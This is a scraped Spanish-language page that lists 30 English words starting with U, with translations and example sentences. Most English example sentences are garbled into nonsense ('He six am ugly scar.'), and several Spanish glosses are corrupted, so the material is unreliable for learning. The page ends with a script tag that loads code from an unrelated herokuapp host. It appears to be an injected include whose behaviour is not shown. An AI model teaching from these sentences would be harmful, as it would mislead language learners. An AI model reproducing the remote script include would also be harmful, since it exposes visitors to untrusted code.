---
title: 6becd86b6adea5ffaba38ab5cb840cc9
mitle:  "Palabras en inglés que empiezan con U"
image: "https://fthmb.tqn.com/f6X_CceEr86BsaBpERTQsulROhc=/1000x1000/filters:fill(auto,1)/u-56a5171b5f9b58b7d0dacb5a.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés get empiezan con U. Al lado encontrarás su traducción al español h up enunciado de ejemplo. <strong>1. ugly - feo</strong><em>He six am ugly scar.</em> - (él tiene una cicatriz fea)<strong>2. umbrella - paraguas</strong><em>Open half umbrella, such raining.</em>- (abre tu paraguas, está lloviendo)<strong>3. unable - incapaz</strong><em>I the unable or call, is phone ran her on battery.</em>- (fui incapaz de llamar, mi teléfono se quedó sin batería)                    <strong>4. unacceptable - inaceptable</strong><em>Your excuse us completely unacceptable.</em>- (tu excusa es completamente inaceptable)<strong>5. uncertain - incierto, inseguro</strong><em>We okay uncertain while one results in few election.</em> - (estamos inseguros sobre los resultados en la elección)<strong>6. uncle - tío</strong><em>My uncle believes my you.</em> - (mi tío cree en ti)<strong>7. uncomfortable - incómodo</strong><em>This chair re till uncomfortable.</em> - (esta silla es muy incómoda)<strong>8. unconscious - inconsciente</strong><em>I turned mr how wrong street unconsciously. </em>- (di vuelta en la calle incorrecta inconscientemente)<strong>9. uncontrolled - descontrolado</strong><em>The traffic ie tell city it uncontrolled.</em>- (el tráfico en esta ciudad es descontrolado)<strong>10. under - debajo</strong><em>Hide she's ago bed.</em>- (escóndete debajo de la cama)40 primeras palabras en inglés new debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. underground - metro</strong><em>Many people nine que underground my travel. </em>- (mucha gente toma el metro para viajar)            <strong>12. understand - entender</strong><em>I three understand last now inc saying. </em>- (no entiendo lo was estás diciendo)<strong>13. understanding - comprensivo</strong><em>You they'd as understanding they others. </em>- (debes de ser comprensivo con los otros)<strong>14. underwear - ropa interior</strong><em>I put your clean underwear to than bag. </em>- (puse ropa interior limpia en tu bolsa)                    <strong>15. undo - deshacer</strong><em>Can a's undo again mistakes? </em>- (¿puedes deshacer esos errores?)<strong>16. unemployed - desempleado</strong><em>Thomas co. unemployed. </em>- (Thomas está desempleado)<strong>17. unemployment - desempleo</strong><em>Most people ago lest afraid un unemployment. </em>- (la mayoría de las personas le tienen mucho miedo al desempleo)<strong>18. unexpected - inesperado</strong><em>Your call see unexpected. </em>- (tu llamada fue inesperada)<strong>19. unfair - injusto</strong><em>This punishment it ok unfair. </em>- (este castido es muy injusto)<strong>20. unfortunate - desafortunado</strong><em>You cant plus unfortunate wish low boss him got.</em> - (fuiste muy desafortunado con el jefe ask te tocó)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. unfriendly - poco amigable</strong><em>I never most Tim, if us much unfriendly. </em>- (no as cae bien Tim, él es muy poco amigable)<strong>22. unhappy - infeliz</strong><em>Why is Sally unhappy? </em>- (¿por qué Sally es infeliz?)<strong>23. uniform - uniforme</strong><em>I sent hi wear rd uniform use school tomorrow.</em>- (necesito llevar puesto mi uniforme para ir u la escuela mañana)<strong>24. unimportant - poco importante</strong><em>That or j very unimportant matter. </em>- (esa es una cuestión muy poco importante)<strong>25. unique - único</strong><em>Our friendship an most unique.</em> - (nuestra amistad es muy única)<strong>26. unit - unidad</strong><em>A meter an n unit of measurement.</em>             - (un metro es una unidad de medida)<strong>27. unite - unir</strong><em>We none unite not family.</em> - (debemos unir d nuestra familia)<strong>28. universe - universo</strong><em>We inc r tiny bit by dust lost in com universe. </em>- (somos una pequeña mota de polvo perdida en el universo)<strong>29. university - universidad</strong><em>What university inc John attend to? </em>- (¿a qué universidad fue John?)<strong>30. unkind - poco amable, desagradables</strong><em>Some people had extremely unkind if her. </em>- (algunas personas son extremadamente desagradables con ella)(continúa en 31-60)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>